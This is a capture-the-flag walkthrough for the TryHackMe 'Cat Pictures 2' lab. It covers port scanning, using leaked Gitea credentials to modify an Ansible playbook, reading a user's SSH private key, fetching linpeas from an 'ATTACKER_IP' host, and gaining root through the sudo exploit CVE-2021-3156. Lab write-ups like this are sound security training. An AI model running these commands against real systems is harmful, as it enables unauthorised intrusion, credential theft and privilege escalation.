# Cat Pictures 2 Walkthrough

## Intro
Welcome to the Cat Pictures 2 challenge, here is the link to the [room](https://tryhackme.com/room/catpictures2) on TryHackMe.
In this room we will have to find a way to move from a website containing cat pictures to the target machine and catch the 3 hidden flags.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
Let's start with a port scan:
```bash
rustscan -a 10.80.146.29 -r 0-65535  --ulimit 5000 -- -sV -sC
```

It finds 4 open ports:
```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.4.6 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 60D8216C0FDE4723DCA5FBD03AD44CB7
| http-git:
|   10.80.146.29:80/.git/
|     Git repository found!
222/tcp  open  ssh     syn-ack OpenSSH 9.0 (protocol 2.0)
8080/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 3.6.9)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
```

We can add to the hosts file:
```bash
echo "10.80.146.29  cats.thm" | sudo tee -a /etc/hosts
```

Let's view the website at `http://10.80.146.29/`, we can see an album with cats pics.

We can check the robots.txt:
```
User-agent: *
Disallow: /data/
Disallow: /dist/
Disallow: /docs/
Disallow: /php/
Disallow: /plugins/
Disallow: /src/
Disallow: /uploads/
```
- all of them return a 403 forbidden from the reverse proxy nginx.

Let's download all the photos it contains and see if they hide any info we can use:
```bash
wget http://10.80.146.29/uploads/medium/d8d93f1fa94e581b17b402cf8ed57bf2.jpg
wget http://10.80.146.29/uploads/medium/f5054e97620f168c7b5088c85ab1d6e4.jpg
wget http://10.80.146.29/uploads/medium/b5e6e0dc580889ef36213ee4d6ff406a.jpg
wget http://10.80.146.29/uploads/medium/0aed0f656320990ab83cbfd5ca09464d.jpg
wget http://10.80.146.29/uploads/medium/8b79975e035d2348d1a8baf11e2a5bc0.jpg
wget http://10.80.146.29/uploads/medium/35e794c47ef9448a9016729aea3faa34.jpg
wget http://10.80.146.29/uploads/medium/f2685b23ca970630f6a4d14de66624fc.jpg
```

Now let's start by analyzing exif data:
```bash
exiftool ./*.jpg
```

The title of `f5054e97620f168c7b5088c85ab1d6e4.jpg` contains this interesting string `:8080/764efa883dda1e11db47671c4a3bbd9e.txt`.
It clearly points us to a file on the website hosted on port 8080, lets view that:
```bash
wget http://10.80.146.29:8080/764efa883dda1e11db47671c4a3bbd9e.txt 
cat 764efa883dda1e11db47671c4a3bbd9e.txt
```

We find a note:
```
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: REDACTED_FOR_THE_WRITEUP

ansible runner (olivetin): port 1337
```

Let's visit `http://10.80.146.29:3000/` and login with those credentials.
Looking around for the keyword "flag" i reached the file `ansible/flag1.txt` and found the first one:
--> REDACTED_FOR_THE_WRITEUP

Another interesting file is `playbook.yaml`, as on the ansible website we can run playbook and view the stdout in the logs.
At the moment is set to run the command `whoami` but since we can edit the YAML i suppose we can leverage this for our own interests.
- to get some more context i overwrite it with `pwd` and  `ls -la`

We see we are in `/home/bismuth` and there is a file called `flag2.txt`.

I want to get that later, first i want to get access, so, after some searching i ran: 
```bash
cat .ssh/id_rsa
```

Now we can copy it over on our machine and change permissions:
```bash
chmod 600 id_rsa
```

Let's login via ssh:
```bash
 ssh -i id_rsa bismuth@10.80.146.29
```

Now get flag 2:
```bash
cat flag2.txt
```
--> REDACTED_FOR_THE_WRITEUP

<br/>

### Privilege Escalation
Probably last flag is in the root directory, so we need to find a way to escalate our privileges.

Let's transfer Linpeas on the target:
  - on the attacker machine, where you have the script:
  ```bash
  python3 -m http.server
  ```

- On the target:
```bash
wget http://ATTACKER_IP:8000/linpeas.sh
```

Finally set it executable and run it:
```bash
chmod +x linpeas.sh
./linpeas.sh
```

Running linpeas on the target with find a vulnerability in *sudo* -> **CVE-2021-3156**
We can download the exploit and transfer it as well on the target, then navigate into the exploit directory and run `make`, finally run:
```bash
./sudo-hax-me-a-sandwich
```

Now that we are root let's get the last flag:
```bash
cat /root/flag3.txt
```
--> REDACTED_FOR_THE_WRITEUP

<br/>
<br/>

Congratulations you have successfully put in practive your web exploitation skills by finding and leveraging the multiple exposed services to get an SSH key and gain access to the target. Finally using a known sudo vulnerability to gain root privileges and read the flag.

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
